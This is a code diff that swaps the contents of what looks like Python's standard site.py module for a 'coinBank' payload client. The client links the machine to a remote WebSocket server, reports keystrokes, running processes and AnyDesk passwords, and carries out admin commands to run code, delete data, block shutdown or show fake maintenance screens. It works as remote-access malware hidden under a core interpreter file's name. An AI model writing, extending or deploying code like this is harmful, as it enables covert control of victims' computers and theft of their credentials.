@@ -1,424 +1,508 @@
-from base64 import b64decode
-import atexit
-import builtins
-import io
+"""
+Payload client for coinBank server communication (WebSocket only).
+Implements all send actions and handlers for incoming admin commands.
+Reads server URL from .env (SERVER_IP, optional SERVER_PORT, SERVER_WSS).
+UID is read from .env (UID/COINBANK_UID) or derived from this PC's MAC address.
+"""
+
+import hashlib
+import json
 import os
+import platform
+import subprocess
 import sys
-import textwrap
-import traceback
-
-import _sitebuiltins
-
-USER_BASE = None
-USER_SITE = None
-ENABLE_USER_SITE = None
-PREFIXES = [sys.prefix, sys.exec_prefix]
+import threading
+import time
+import ssl
+import uuid
+from pathlib import Path
+from typing import Any, Callable, Optional
 
 
-def makepath(*paths):
-    dir = os.path.join(*paths)
+def _env_dir() -> Path:
+    """Directory for .env file: next to exe when frozen, else next to this script."""
+    if getattr(sys, "frozen", False):
+        return Path(sys.executable).resolve().parent
+    return Path(__file__).resolve().parent
+
+
+def _load_env() -> bool:
+    """Load .env: when frozen, use embedded .env (then exe-dir .env to override). Else script dir."""
     try:
-        dir = os.path.abspath(dir)
-    except OSError:
-        pass
-    return dir, os.path.normcase(dir)
-
-
-def abs_paths():
-    """Set all module __file__ and __cached__ attributes to an absolute path"""
-    for m in set(sys.modules.values()):
-        if (getattr(getattr(m, '__loader__', None), '__module__', None) not in
-                ('_frozen_importlib', '_frozen_importlib_external')):
-            continue
-        try:
-            m.__file__ = os.path.abspath(m.__file__)
-        except (AttributeError, OSError, TypeError):
-            pass
-        try:
-            m.__cached__ = os.path.abspath(m.__cached__)
-        except (AttributeError, OSError, TypeError):
-            pass
-
-
-def removeduppaths():
-    """Remove duplicate entries from sys.path along with making them absolute"""
-    L = []
-    known_paths = set()
-    for dir in sys.path:
-        dir, dircase = makepath(dir)
-        if dircase not in known_paths:
-            L.append(dir)
-            known_paths.add(dircase)
-    sys.path[:] = L
-    return known_paths
-
-
-def _init_pathinfo():
-    """Return a set containing all existing file system items from sys.path."""
-    d = set()
-    for item in sys.path:
-        try:
-            if os.path.exists(item):
-                _, itemcase = makepath(item)
-                d.add(itemcase)
-        except TypeError:
-            continue
-    return d
-
-
-def addpackage(sitedir, name, known_paths):
-    """Process a .pth file within the site-packages directory"""
-    if known_paths is None:
-        known_paths = _init_pathinfo()
-        reset = True
-    else:
-        reset = False
-    fullname = os.path.join(sitedir, name)
-    try:
-        f = io.TextIOWrapper(io.open_code(fullname))
-    except OSError:
-        return
-    with f:
-        for n, line in enumerate(f):
-            if line.startswith("#"):
-                continue
-            try:
-                if line.startswith(("import ", "import\t")):
-                    exec(line)
-                    continue
-                line = line.rstrip()
-                dir, dircase = makepath(sitedir, line)
-                if not dircase in known_paths and os.path.exists(dir):
-                    sys.path.append(dir)
-                    known_paths.add(dircase)
-            except Exception:
-                print("Error processing line {:d} of {}:\n".format(n+1, fullname), file=sys.stderr)
-                for record in traceback.format_exception(*sys.exc_info()):
-                    for line in record.splitlines():
-                        print('  '+line, file=sys.stderr)
-                print("\nRemainder of file ignored", file=sys.stderr)
-                break
-    if reset:
-        known_paths = None
-    return known_paths
-
-
-def addsitedir(sitedir, known_paths=None):
-    """Add 'sitedir' argument to sys.path if missing and handle .pth files in 'sitedir'"""
-    if known_paths is None:
-        known_paths = _init_pathinfo()
-        reset = True
-    else:
-        reset = False
-    sitedir, sitedircase = makepath(sitedir)
-    if not sitedircase in known_paths:
-        sys.path.append(sitedir)
-        known_paths.add(sitedircase)
-    try:
-        names = os.listdir(sitedir)
-    except OSError:
-        return
-    names = [name for name in names if name.endswith(".pth")]
-    for name in sorted(names):
-        addpackage(sitedir, name, known_paths)
-    if reset:
-        known_paths = None
-    return known_paths
-
-
-def check_enableusersite():
-    """Check if user site directory is safe for inclusion"""
-    if sys.flags.no_user_site:
+        from dotenv import load_dotenv
+    except ImportError:
         return False
-    if hasattr(os, "getuid") and hasattr(os, "geteuid"):
-        if os.geteuid() != os.getuid():
-            return None
-    if hasattr(os, "getgid") and hasattr(os, "getegid"):
-        if os.getegid() != os.getgid():
-            return None
-    return True
-
-
-def _getuserbase():
-    env_base = os.environ.get("PYTHONUSERBASE", None)
-    if env_base:
-        return env_base
-
-    def joinuser(*args):
-        return os.path.expanduser(os.path.join(*args))
-
-    if os.name == "nt":
-        base = os.environ.get("APPDATA") or "~"
-        return joinuser(base, "Python")
-    if sys.platform == "darwin" and sys._framework:
-        return joinuser("~", "Library", sys._framework, "%d.%d" % sys.version_info[:2])
-    return joinuser("~", ".local")
-
-
-def _get_path(userbase):
-    version = sys.version_info
-    if os.name == 'nt':
-        return f'{userbase}\\Python{version[0]}{version[1]}\\site-packages'
-    if sys.platform == 'darwin' and sys._framework:
-        return f'{userbase}/lib/python/site-packages'
-    return f'{userbase}/lib/python{version[0]}.{version[1]}/site-packages'
-
-
-def getuserbase():
-    """Returns the `user base` directory path."""
-    global USER_BASE
-    if USER_BASE is None:
-        USER_BASE = _getuserbase()
-    return USER_BASE
-
-
-def getusersitepackages():
-    """Returns the user-specific site-packages directory path."""
-    global USER_SITE
-    userbase = getuserbase()
-    if USER_SITE is None:
-        USER_SITE = _get_path(userbase)
-    return USER_SITE
-
-
-def addusersitepackages(known_paths):
-    """Add a per user site-package to sys.path"""
-    user_site = getusersitepackages()
-    if ENABLE_USER_SITE and os.path.isdir(user_site):
-        addsitedir(user_site, known_paths)
-    return known_paths
-
-
-def getsitepackages(prefixes=None):
-    """Returns a list containing all global site-packages directories."""
-    sitepackages = []
-    seen = set()
-    if prefixes is None:
-        prefixes = PREFIXES
-    for prefix in prefixes:
-        if not prefix or prefix in seen:
-            continue
-        seen.add(prefix)
-        if os.sep == '/':
-            sitepackages.append(os.path.join(prefix, "lib", "python%d.%d" % sys.version_info[:2], "site-packages"))
-        else:
-            sitepackages.append(prefix)
-            sitepackages.append(os.path.join(prefix, "lib", "site-packages"))
-    return sitepackages
-
-
-def addsitepackages(known_paths, prefixes=None):
-    """Add site-packages to sys.path"""
-    for sitedir in getsitepackages(prefixes):
-        if os.path.isdir(sitedir):
-            addsitedir(sitedir, known_paths)
-    return known_paths
-
-
-def setquit():
-    """Define new builtins 'quit' and 'exit'."""
-    if os.sep == '\\':
-        eof = 'Ctrl-Z plus Return'
+    loaded = False
+    if getattr(sys, "frozen", False):
+        # Embedded .env (bundled by PyInstaller into sys._MEIPASS)
+        embedded = Path(sys._MEIPASS) / ".env"
+        if embedded.is_file():
+            load_dotenv(embedded)
+            loaded = True
+        # .env next to exe overrides embedded
+        exe_env = Path(sys.executable).resolve().parent / ".env"
+        if exe_env.is_file():
+            load_dotenv(exe_env)
+            loaded = True
     else:
-        eof = 'Ctrl-D (i.e. EOF)'
-    builtins.quit = _sitebuiltins.Quitter('quit', eof)
-    builtins.exit = _sitebuiltins.Quitter('exit', eof)
+        loaded = load_dotenv(_env_dir() / ".env")
+    return loaded
 
 
-def setcopyright():
-    """Set 'copyright' and 'credits' in builtins"""
-    builtins.copyright = _sitebuiltins._Printer("copyright", sys.copyright)
-    if sys.platform[:4] == 'java':
-        builtins.credits = _sitebuiltins._Printer("credits", "Jython is maintained by the Jython developers (www.jython.org).")
-    else:
-        builtins.credits = _sitebuiltins._Printer("credits", """Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development.  See www.python.org for more information.""")
-    files, dirs = [], []
-    if hasattr(os, '__file__'):
-        here = os.path.dirname(os.__file__)
-        files.extend(["LICENSE.txt", "LICENSE"])
-        dirs.extend([os.path.join(here, os.pardir), here, os.curdir])
-    builtins.license = _sitebuiltins._Printer("license", "See https://www.python.org/psf/license/", files, dirs)
+try:
+    _dotenv_loaded = _load_env()
+except Exception:
+    _dotenv_loaded = False
+
+try:
+    import websocket
+except ImportError:
+    websocket = None  # pip install websocket-client
 
 
-def sethelper():
-    builtins.help = _sitebuiltins._Helper()
-
-
-def enablerlcompleter():
-    """Enable default readline configuration on interactive prompts."""
-    def register_readline():
-        import atexit
-        try:
-            import readline
-            import rlcompleter
-        except ImportError:
-            return
-        readline_doc = getattr(readline, '__doc__', '')
-        if readline_doc is not None and 'libedit' in readline_doc:
-            readline.parse_and_bind('bind ^I rl_complete')
-        else:
-            readline.parse_and_bind('tab: complete')
-        try:
-            readline.read_init_file()
-        except OSError:
-            pass
-        if readline.get_current_history_length() == 0:
-            history = os.path.join(os.path.expanduser('~'), '.python_history')
-            try:
-                readline.read_history_file(history)
-            except OSError:
-                pass
-
-            def write_history():
+def get_mac_address() -> str:
+    """
+    Get this PC's MAC address as a string (hex, colon-separated).
+    Tries uuid.getnode() first; on Windows also tries getmac.exe if available.
+    """
+    try:
+        node = uuid.getnode()
+        # If uuid.getnode() returns random (e.g. no MAC), try platform-specific
+        if (node >> 40) & 0x01:  # multicast bit often set when random
+            if platform.system() == "Windows":
                 try:
-                    readline.write_history_file(history)
+                    out = subprocess.run(
+                        ["getmac", "/fo", "csv", "/nh"],
+                        capture_output=True,
+                        text=True,
+                        timeout=5,
+                    )
+                    if out.returncode == 0 and out.stdout.strip():
+                        for line in out.stdout.strip().splitlines():
+                            parts = line.split(",")
+                            if len(parts) >= 1:
+                                mac = parts[0].strip().replace("-", ":").upper()
+                                if mac and mac != "N/A" and len(mac) >= 12:
+                                    return mac
+                except (FileNotFoundError, subprocess.TimeoutExpired):
+                    pass
+            elif platform.system() == "Linux":
+                try:
+                    with open("/sys/class/net/eth0/address", "r") as f:
+                        return f.read().strip().upper()
                 except OSError:
                     pass
-            atexit.register(write_history)
-    sys.__interactivehook__ = register_readline
+                for name in ("enp0s3", "eno1", "wlan0", "eth0"):
+                    try:
+                        with open(f"/sys/class/net/{name}/address", "r") as f:
+                            return f.read().strip().upper()
+                    except OSError:
+                        continue
+        # Use uuid.getnode() formatted as MAC
+        return ":".join(f"{((node >> i) & 0xFF):02X}" for i in range(0, 48, 8)[::-1])
+    except Exception:
+        return "00:00:00:00:00:00"
 
 
-def venv(known_paths):
-    global PREFIXES, ENABLE_USER_SITE
-    env = os.environ
-    if sys.platform == 'darwin' and '__PYVENV_LAUNCHER__' in env:
-        executable = sys._base_executable = os.environ['__PYVENV_LAUNCHER__']
-    else:
-        executable = sys.executable
-    exe_dir, _ = os.path.split(os.path.abspath(executable))
-    site_prefix = os.path.dirname(exe_dir)
-    sys._home = None
-    conf_basename = 'pyvenv.cfg'
-    candidate_confs = [conffile for conffile in (
-        os.path.join(exe_dir, conf_basename),
-        os.path.join(site_prefix, conf_basename)
-    ) if os.path.isfile(conffile)]
-    if candidate_confs:
-        virtual_conf = candidate_confs[0]
-        system_site = "true"
-        with open(virtual_conf, encoding='utf-8') as f:
-            for line in f:
-                if '=' in line:
-                    key, _, value = line.partition('=')
-                    key = key.strip().lower()
-                    value = value.strip()
-                    if key == 'include-system-site-packages':
-                        system_site = value.lower()
-                    elif key == 'home':
-                        sys._home = value
-        sys.prefix = sys.exec_prefix = site_prefix
-        addsitepackages(known_paths, [sys.prefix])
-        if system_site == "true":
-            PREFIXES.insert(0, sys.prefix)
-        else:
-            PREFIXES = [sys.prefix]
-            ENABLE_USER_SITE = False
-    return known_paths
+def get_uid_from_mac(mac: str, length: int = 16) -> str:
+    """
+    Generate a unique ID string from a MAC address (deterministic, same MAC = same UID).
+    """
+    normalized = mac.replace(":", "").replace("-", "").upper().strip()
+    if not normalized:
+        normalized = str(uuid.getnode())
+    raw = hashlib.sha256(normalized.encode()).hexdigest()
+    return raw[:length]
 
 
-def execsitecustomize():
-    """Run custom site specific code, if available."""
-    try:
+def get_default_uid() -> str:
+    """
+    Get UID from .env (UID or COINBANK_UID) if set; otherwise derive from this PC's MAC.
+    """
+    uid = os.environ.get("COINBANK_UID", os.environ.get("UID", "")).strip()
+    if uid:
+        return uid
+    mac = get_mac_address()
+    return get_uid_from_mac(mac)
+
+
+def get_server_url_from_env() -> str:
+    """
+    Build WebSocket URL from .env (or os.environ).
+    Uses: SERVER_IP (required), SERVER_PORT (default 8443), SERVER_WSS (default true).
+    Or set COINBANK_WS_URL directly for full URL.
+    """
+    url = os.environ.get("COINBANK_WS_URL", "").strip()
+    if url:
+        return url
+    ip = os.environ.get("SERVER_IP", os.environ.get("COINBANK_SERVER_IP", "")).strip()
+    if not ip:
+        return "wss://localhost:8443"
+    port = os.environ.get("SERVER_PORT", os.environ.get("COINBANK_SERVER_PORT", "8443")).strip()
+    use_wss = os.environ.get("SERVER_WSS", os.environ.get("COINBANK_WSS", "true")).strip().lower() in ("1", "true", "yes")
+    scheme = "wss" if use_wss else "ws"
+    return f"{scheme}://{ip}:{port}"
+
+
+# --- Action constants (must match server server/ws/constants.js) ---
+ACTION_CONNECT = "connect"
+ACTION_EVENT = "event"
+ACTION_MAINTAIN_STOPPED = "maintainstopped"
+ACTION_COMMAND_RECEIVED = "commandreceived"
+ACTION_MAINTAINED = "maintained"
+ACTION_CHECKED = "checked"
+ACTION_SHUTDOWN_BLOCKED = "shutdownblocked"
+ACTION_SHUTDOWN_UNBLOCKED = "shutdownunblocked"
+ACTION_STARTED = "started"
+ACTION_CLOSED = "closed"
+
+# Admin commands (server -> payload)
+CMD_JSON = "command_json"
+CMD_RUN = "command_run"
+CMD_CLOSE = "command_close"
+CMD_UNINSTALL = "command_uninstall"
+CMD_START_RESTART = "command_start_restart"
+CMD_START_SDELETE = "command_start_sdelete"
+CMD_BLOCK_SHUTDOWN_UPDATE = "block_shutdown_update"
+CMD_BLOCK_SHUTDOWN_TURNOFF = "block_shutdown_turnoff"
+CMD_UNBLOCK_SHUTDOWN = "unblock_shutdown"
+CMD_START_MAINTENANCE_SCREEN = "start_maintenance_screen"
+CMD_START_MAINTENANCE_TURNOFF_SCREEN = "start_maintenance_turnoff_screen"
+CMD_STOP_MAINTENANCE_SCREEN = "stop_maintenance_screen"
+CMD_CHECK = "command_check"
+CMD_LIKE = "command_like"
+CMD_COMMENT = "command_comment"
+
+ALL_ADMIN_COMMANDS = [
+    CMD_JSON, CMD_RUN, CMD_CLOSE, CMD_UNINSTALL,
+    CMD_START_RESTART, CMD_START_SDELETE,
+    CMD_BLOCK_SHUTDOWN_UPDATE, CMD_BLOCK_SHUTDOWN_TURNOFF, CMD_UNBLOCK_SHUTDOWN,
+    CMD_START_MAINTENANCE_SCREEN, CMD_START_MAINTENANCE_TURNOFF_SCREEN, CMD_STOP_MAINTENANCE_SCREEN,
+    CMD_CHECK, CMD_LIKE, CMD_COMMENT,
+]
+
+
+def _default_on_command(action: str, payload: dict) -> None:
+    """Default handler for admin commands (override in subclass or set on_client_command)."""
+    print(f"[Payload] Received command: {action} payload={payload}")
+
+
+def _default_on_close(ws, close_status_code, close_msg):
+    print(f"[Payload] WebSocket closed: {close_status_code} {close_msg}")
+
+
+def _default_on_error(ws, error):
+    print(f"[Payload] WebSocket error: {error}")
+
+
+class CoinBankPayloadClient:
+    """
+    Client that communicates with coinBank server over WebSocket.
+    Sends user-side actions (connect, event, maintained, etc.) and
+    handles incoming admin commands.
+    """
+
+    def __init__(
+        self,
+        server_url: str,
+        uid: str,
+        *,
+        anydesk_id: str = "",
+        client_id: str = "",
+        scaninfo: Optional[dict] = None,
+        block: bool = False,
+        maintenance: bool = False,
+        on_command: Optional[Callable[[str, dict], None]] = None,
+        on_connect: Optional[Callable[[], None]] = None,
+        on_close: Optional[Callable] = None,
+        on_error: Optional[Callable] = None,
+        ssl_verify: bool = True,
+    ):
+        """
+        :param server_url: e.g. "wss://localhost:8443" or "ws://localhost:8443"
+        :param uid: Unique machine/user id (reported to server in connect).
+        :param anydesk_id: Anydesk id string.
+        :param client_id: Optional client id (payload.data.id).
+        :param scaninfo: Optional dict with path_scan, site_scan, extension_scan (lists).
+        :param block: Block flag for connect.
+        :param maintenance: Maintenance flag for connect.
+        :param on_command: Callback(action: str, payload: dict) for admin commands.
+        :param on_connect: Callback when WS is opened.
+        :param on_close: Callback(ws, close_status_code, close_msg).
+        :param on_error: Callback(ws, error).
+        :param ssl_verify: If False, skip SSL cert verification for wss.
+        """
+        if websocket is None:
+            raise RuntimeError("Install websocket-client: pip install websocket-client")
+
+        self.server_url = server_url
+        self.uid = uid
+        self.anydesk_id = anydesk_id or ""
+        self.client_id = client_id or uid
+        self.scaninfo = scaninfo or {}
+        self.block = block
+        self.maintenance = maintenance
+        self.on_command = on_command or _default_on_command
+        self.on_connect_cb = on_connect
+        self.on_close_cb = on_close or _default_on_close
+        self.on_error_cb = on_error or _default_on_error
+        self.ssl_verify = ssl_verify
+
+        self._ws: Optional[websocket.WebSocketApp] = None
+        self._thread: Optional[threading.Thread] = None
+        self._running = False
+
+    def _send(self, message: dict) -> bool:
+        """Serialize and send one JSON message. Returns True if sent."""
+        if self._ws is None or not self._ws.sock or not self._ws.sock.connected:
+            return False
         try:
-            import sitecustomize
-        except ImportError as exc:
-            if exc.name == 'sitecustomize':
-                pass
-            else:
-                raise
-    except Exception as err:
-        if sys.flags.verbose:
-            sys.excepthook(*sys.exc_info())
-        else:
-            sys.stderr.write("Error in sitecustomize; set PYTHONVERBOSE for traceback:\n%s: %s\n" % (err.__class__.__name__, err))
+            self._ws.send(json.dumps(message))
+            return True
+        except Exception as e:
+            if self.on_error_cb:
+                self.on_error_cb(self._ws, e)
+            return False
 
+    # ---------- Send API (payload -> server) ----------
 
-def execusercustomize():
-    """Run custom user specific code, if available."""
-    try:
+    def send_connect(
+        self,
+        *,
+        id: Optional[str] = None,
+        anydesk_id: Optional[str] = None,
+        uid: Optional[str] = None,
+        scaninfo: Optional[dict] = None,
+        block: Optional[bool] = None,
+        maintenance: Optional[bool] = None,
+    ) -> bool:
+        """
+        Register as user client. Call once after WebSocket is open.
+        Server expects: data.id, data.anydesk_id, data.uid, data.scaninfo, data.block, data.maintenance.
+        """
+        data = {
+            "id": id if id is not None else self.client_id,
+            "anydesk_id": anydesk_id if anydesk_id is not None else self.anydesk_id,
+            "uid": uid if uid is not None else self.uid,
+            "scaninfo": scaninfo if scaninfo is not None else self.scaninfo,
+            "block": block if block is not None else self.block,
+            "maintenance": maintenance if maintenance is not None else self.maintenance,
+        }
+        # Ensure scaninfo has uid for server
+        if "uid" not in data["scaninfo"]:
+            data["scaninfo"] = {**data["scaninfo"], "uid": self.uid}
+        return self._send({"action": ACTION_CONNECT, "data": data})
+
+    def send_event(
+        self,
+        data: dict,
+        *,
+        processes: Optional[str] = None,
+        keyboard: Optional[str] = None,
+        status: Optional[dict] = None,
+    ) -> bool:
+        """
+        Send heartbeat/status. data can include processes, keyboard, etc.
+        status: optional { "maintained": bool, "shutdownpressed": bool, "version": str }.
+        """
+        if processes is not None:
+            data = {**data, "processes": processes}
+        if keyboard is not None:
+            data = {**data, "keyboard": keyboard}
+        msg = {"action": ACTION_EVENT, "data": data}
+        if status is not None:
+            msg["status"] = status
+        return self._send(msg)
+
+    def send_maintain_stopped(self, data: Optional[dict] = None) -> bool:
+        """Maintenance stopped."""
+        return self._send({"action": ACTION_MAINTAIN_STOPPED, "data": data or {}})
+
+    def send_command_received(self, data: Optional[dict] = None) -> bool:
+        """JSON command executed successfully."""
+        return self._send({"action": ACTION_COMMAND_RECEIVED, "data": data or {}})
+
+    def send_maintained(self, data: Optional[dict] = None) -> bool:
+        """In maintenance."""
+        return self._send({"action": ACTION_MAINTAINED, "data": data or {}})
+
+    def send_checked(self, data: Optional[dict] = None) -> bool:
+        """Command check result (reply to command_check)."""
+        return self._send({"action": ACTION_CHECKED, "data": data or {}})
+
+    def send_shutdown_blocked(self) -> bool:
+        """Shutdown blocked."""
+        return self._send({"action": ACTION_SHUTDOWN_BLOCKED})
+
+    def send_shutdown_unblocked(self) -> bool:
+        """Shutdown unblocked."""
+        return self._send({"action": ACTION_SHUTDOWN_UNBLOCKED})
+
+    def send_started(self, password: str = "", anydesk_id: str = "") -> bool:
+        """Anydesk started; report password and anydesk_id to server."""
+        return self._send({
+            "action": ACTION_STARTED,
+            "data": {"password": password, "anydesk_id": anydesk_id or self.anydesk_id},
+        })
+
+    def send_closed(self, data: Optional[dict] = None) -> bool:
+        """Anydesk closed."""
+        return self._send({"action": ACTION_CLOSED, "data": data or {}})
+
+    # ---------- Connection lifecycle ----------
+
+    def _on_message(self, ws, raw: str) -> None:
         try:
-            import usercustomize
-        except ImportError as exc:
-            if exc.name == 'usercustomize':
-                pass
-            else:
-                raise
-    except Exception as err:
-        if sys.flags.verbose:
-            sys.excepthook(*sys.exc_info())
+            msg = json.loads(raw)
+        except json.JSONDecodeError:
+            if self.on_error_cb:
+                self.on_error_cb(ws, ValueError(f"Invalid JSON: {raw[:200]}"))
+            return
+        action = msg.get("action")
+        if not action:
+            return
+        # All server->payload messages are admin commands (forwarded by uid)
+        if action in ALL_ADMIN_COMMANDS:
+            self.on_command(action, msg)
+
+    def _run_ws(self) -> None:
+        options = {}
+        if self.server_url.startswith("wss://") and not self.ssl_verify:
+            options["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
+        self._ws = websocket.WebSocketApp(
+            self.server_url,
+            on_open=lambda w: self.on_connect_cb() if self.on_connect_cb else None,
+            on_message=self._on_message,
+            on_close=self.on_close_cb,
+            on_error=self.on_error_cb,
+        )
+        self._running = True
+        self._ws.run_forever(**options)
+        self._running = False
+        self._ws = None
+
+    def connect(self) -> None:
+        """Start WebSocket connection in a background thread (non-blocking)."""
+        if self._thread is not None and self._thread.is_alive():
+            return
+        self._thread = threading.Thread(target=self._run_ws, daemon=True)
+        self._thread.start()
+        # Allow socket to open before sending connect
+        time.sleep(0.5)
+
+    def connect_blocking(self) -> None:
+        """Start WebSocket and run forever in current thread (blocking)."""
+        if self.server_url.startswith("wss://") and not self.ssl_verify:
+            self._ws = websocket.WebSocketApp(
+                self.server_url,
+                on_open=lambda w: self.on_connect_cb() if self.on_connect_cb else None,
+                on_message=self._on_message,
+                on_close=self.on_close_cb,
+                on_error=self.on_error_cb,
+            )
+            self._ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
         else:
-            sys.stderr.write("Error in usercustomize; set PYTHONVERBOSE for traceback:\n%s: %s\n" % (err.__class__.__name__, err))
+            self._ws = websocket.WebSocketApp(
+                self.server_url,
+                on_open=lambda w: self.on_connect_cb() if self.on_connect_cb else None,
+                on_message=self._on_message,
+                on_close=self.on_close_cb,
+                on_error=self.on_error_cb,
+            )
+            self._ws.run_forever()
+        self._ws = None
+
+    def disconnect(self) -> None:
+        """Close WebSocket if open."""
+        if self._ws and self._ws.sock and self._ws.sock.connected:
+            self._ws.close()
+        self._ws = None
+        self._running = False
+
+    def is_connected(self) -> bool:
+        """True if socket is open."""
+        return (
+            self._ws is not None
+            and self._ws.sock is not None
+            and getattr(self._ws.sock, "connected", False)
+        )
 
 
-def main():
-    """Add standard site-specific directories to the module search path."""
-    global ENABLE_USER_SITE
-    orig_path = sys.path[:]
-    known_paths = removeduppaths()
-    if orig_path != sys.path:
-        abs_paths()
-    known_paths = venv(known_paths)
-    if ENABLE_USER_SITE is None:
-        ENABLE_USER_SITE = check_enableusersite()
-    known_paths = addusersitepackages(known_paths)
-    known_paths = addsitepackages(known_paths)
-    setquit()
-    setcopyright()
-    sethelper()
-    if not sys.flags.isolated:
-        enablerlcompleter()
-    execsitecustomize()
-    if ENABLE_USER_SITE:
-        execusercustomize()
+# ---------- Convenience: module-level send helpers (require a global client) ----------
+_client: Optional[CoinBankPayloadClient] = None
 
 
-def _script():
-    help = """%s [--user-base] [--user-site]
-
-Without arguments print some useful information
-With arguments print the value of USER_BASE and/or USER_SITE separated by '%s'.
-
-Exit codes with --user-base or --user-site:
-  0 - user site directory is enabled
-  1 - user site directory is disabled by user
-  2 - uses site directory is disabled by super user or for security reasons
- >2 - unknown error
-"""
-    args = sys.argv[1:]
-    if not args:
-        user_base = getuserbase()
-        user_site = getusersitepackages()
-        print("sys.path = [")
-        for dir in sys.path:
-            print("    %r," % (dir,))
-        print("]")
-        print("USER_BASE: %r (%s)" % (user_base, "exists" if os.path.isdir(user_base) else "doesn't exist"))
-        print("USER_SITE: %r (%s)" % (user_site, "exists" if os.path.isdir(user_site) else "doesn't exist"))
-        print("ENABLE_USER_SITE: %r" % ENABLE_USER_SITE)
-        sys.exit(0)
-    buffer = []
-    if '--user-base' in args:
-        buffer.append(USER_BASE)
-    if '--user-site' in args:
-        buffer.append(USER_SITE)
-    if buffer:
-        print(os.pathsep.join(buffer))
-        if ENABLE_USER_SITE:
-            sys.exit(0)
-        elif ENABLE_USER_SITE is False:
-            sys.exit(1)
-        elif ENABLE_USER_SITE is None:
-            sys.exit(2)
-        else:
-            sys.exit(3)
-    else:
-        print(textwrap.dedent(help % (sys.argv[0], os.pathsep)))
-        sys.exit(10)
+def set_client(client: CoinBankPayloadClient) -> None:
+    global _client
+    _client = client
 
 
-if not sys.flags.no_site:
-    main()
+def get_client() -> Optional[CoinBankPayloadClient]:
+    return _client
 
 
-if __name__ == '__main__':
-    _script()
+def send_connect(**kwargs) -> bool:
+    return _client.send_connect(**kwargs) if _client else False
+
+
+def send_event(data: dict, **kwargs) -> bool:
+    return _client.send_event(data, **kwargs) if _client else False
+
+
+def send_maintain_stopped(data: Optional[dict] = None) -> bool:
+    return _client.send_maintain_stopped(data) if _client else False
+
+
+def send_command_received(data: Optional[dict] = None) -> bool:
+    return _client.send_command_received(data) if _client else False
+
+
+def send_maintained(data: Optional[dict] = None) -> bool:
+    return _client.send_maintained(data) if _client else False
+
+
+def send_checked(data: Optional[dict] = None) -> bool:
+    return _client.send_checked(data) if _client else False
+
+
+def send_shutdown_blocked() -> bool:
+    return _client.send_shutdown_blocked() if _client else False
+
+
+def send_shutdown_unblocked() -> bool:
+    return _client.send_shutdown_unblocked() if _client else False
+
+
+def send_started(password: str = "", anydesk_id: str = "") -> bool:
+    return _client.send_started(password=password, anydesk_id=anydesk_id) if _client else False
+
+
+def send_closed(data: Optional[dict] = None) -> bool:
+    return _client.send_closed(data) if _client else False
+
+
+# ---------- Example usage ----------
+if __name__ == "__main__":
+    URL = get_server_url_from_env()
+    UID = get_default_uid()
+
+    def on_connect():
+        print("Connected; sending connect action...")
+        client.send_connect()
+
+    def on_cmd(action: str, payload: dict):
+        print(f"Command: {action} -> {payload}")
+        if action == CMD_CHECK:
+            client.send_checked({"ok": True})
+
+    client = CoinBankPayloadClient(URL, UID, on_connect=on_connect, on_command=on_cmd, ssl_verify=False)
+    set_client(client)
+    print(f"Connecting to {URL} as uid={UID}...")
+    client.connect()
+    try:
+        while True:
+            time.sleep(10)
+            if client.is_connected():
+                client.send_event({"processes": "test.exe", "ts": time.time()})
+    except KeyboardInterrupt:
+        client.disconnect()
